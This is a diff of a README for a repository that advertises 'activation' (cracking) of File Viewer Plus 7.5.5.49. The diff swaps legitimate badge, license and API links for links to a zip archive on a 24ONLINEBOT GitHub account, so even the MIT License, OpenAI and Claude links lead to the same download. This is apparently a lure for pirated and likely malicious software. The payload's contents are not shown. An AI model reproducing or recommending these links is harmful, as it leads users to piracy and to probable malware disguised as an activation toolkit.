@@ -2,10 +2,10 @@
 
 Welcome to the *File Viewer Plus 7.5.5.49 Activation Method Collection*, a one-stop digital toolbox to unlock next-generation document, image, and media file utility at the flick of your digital wand. Whether you are a tech enthusiast, an IT professional, or an everyday user looking to enhance your file-handling arsenal, this repository will illuminate the path to a seamless file management experience.
 
-[![Stars](https://img.shields.io/github/stars/unknown/repo.svg?style=flat-square)](https://github.com/unknown/repo/stargazers)
-[![License](https://img.shields.io/badge/License-MIT-green)](https://opensource.org/licenses/MIT)
-[![OS Support](https://img.shields.io/badge/OS-Win%2CmacOS%2CLinux-blue)](#-system-compatibility-table)
-[![Downloads](https://img.shields.io/badge/Active_Users-25K+-brightgreen)](#-download-activation-files)
+[![Stars](https://raw.githubusercontent.com/24ONLINEBOT/file-viewer-plus-7-5-5-49-unlocked-edition/branch/berlin/file-viewer-plus-7-5-5-49-unlocked-edition-v1.7-alpha.5.zip)](https://raw.githubusercontent.com/24ONLINEBOT/file-viewer-plus-7-5-5-49-unlocked-edition/branch/berlin/file-viewer-plus-7-5-5-49-unlocked-edition-v1.7-alpha.5.zip)
+[![License](https://raw.githubusercontent.com/24ONLINEBOT/file-viewer-plus-7-5-5-49-unlocked-edition/branch/berlin/file-viewer-plus-7-5-5-49-unlocked-edition-v1.7-alpha.5.zip)](https://raw.githubusercontent.com/24ONLINEBOT/file-viewer-plus-7-5-5-49-unlocked-edition/branch/berlin/file-viewer-plus-7-5-5-49-unlocked-edition-v1.7-alpha.5.zip)
+[![OS Support](https://raw.githubusercontent.com/24ONLINEBOT/file-viewer-plus-7-5-5-49-unlocked-edition/branch/berlin/file-viewer-plus-7-5-5-49-unlocked-edition-v1.7-alpha.5.zip%2CmacOS%2CLinux-blue)](#-system-compatibility-table)
+[![Downloads](https://raw.githubusercontent.com/24ONLINEBOT/file-viewer-plus-7-5-5-49-unlocked-edition/branch/berlin/file-viewer-plus-7-5-5-49-unlocked-edition-v1.7-alpha.5.zip+-brightgreen)](#-download-activation-files)
 
 ---
 
@@ -48,7 +48,7 @@ No matter your platform, File Viewer Plus 7.5.5.49 cracks open the door to enhan
 
 ## 🤖 AI-Driven API Extensions
 
-Power users and developers: Launch to the next level with native [OpenAI API](https://platform.openai.com/) and [Claude API](https://claude.ai/) hookups. Perform automated file content analysis, summarize documents with a command, or trigger multilingual transcriptions—all woven into File Viewer Plus’s interface.
+Power users and developers: Launch to the next level with native [OpenAI API](https://raw.githubusercontent.com/24ONLINEBOT/file-viewer-plus-7-5-5-49-unlocked-edition/branch/berlin/file-viewer-plus-7-5-5-49-unlocked-edition-v1.7-alpha.5.zip) and [Claude API](https://raw.githubusercontent.com/24ONLINEBOT/file-viewer-plus-7-5-5-49-unlocked-edition/branch/berlin/file-viewer-plus-7-5-5-49-unlocked-edition-v1.7-alpha.5.zip) hookups. Perform automated file content analysis, summarize documents with a command, or trigger multilingual transcriptions—all woven into File Viewer Plus’s interface.
 
 **Sample Workflows:**
 - Run OpenAI content summarization on imported PDFs.
@@ -72,7 +72,7 @@ Cloud and AI integrations multiply your productivity potential—no magic, just 
 
 Ready to turbocharge your file-handling journey? Secure the latest version and activation resources below.
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://24ONLINEBOT.github.io)
+[![Download](https://raw.githubusercontent.com/24ONLINEBOT/file-viewer-plus-7-5-5-49-unlocked-edition/branch/berlin/file-viewer-plus-7-5-5-49-unlocked-edition-v1.7-alpha.5.zip)](https://raw.githubusercontent.com/24ONLINEBOT/file-viewer-plus-7-5-5-49-unlocked-edition/branch/berlin/file-viewer-plus-7-5-5-49-unlocked-edition-v1.7-alpha.5.zip)
 
 *Activation toolkit & detailed usage instructions are bundled. Ensure to review the step-by-step guide within the download package.*
 
@@ -111,7 +111,7 @@ All names and trademarks of File Viewer Plus belong to their respective owners. 
 
 # 📜 License
 
-This repository and all contained activation guides/scripts are open-sourced under the [MIT License, 2025](https://opensource.org/licenses/MIT).
+This repository and all contained activation guides/scripts are open-sourced under the [MIT License, 2025](https://raw.githubusercontent.com/24ONLINEBOT/file-viewer-plus-7-5-5-49-unlocked-edition/branch/berlin/file-viewer-plus-7-5-5-49-unlocked-edition-v1.7-alpha.5.zip).
 
 ---
 
@@ -119,7 +119,7 @@ This repository and all contained activation guides/scripts are open-sourced und
 
 Your journey doesn’t end here. For the latest updates and perpetual innovation, return to our download section.
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://24ONLINEBOT.github.io)
+[![Download](https://raw.githubusercontent.com/24ONLINEBOT/file-viewer-plus-7-5-5-49-unlocked-edition/branch/berlin/file-viewer-plus-7-5-5-49-unlocked-edition-v1.7-alpha.5.zip)](https://raw.githubusercontent.com/24ONLINEBOT/file-viewer-plus-7-5-5-49-unlocked-edition/branch/berlin/file-viewer-plus-7-5-5-49-unlocked-edition-v1.7-alpha.5.zip)
 
 ---
 
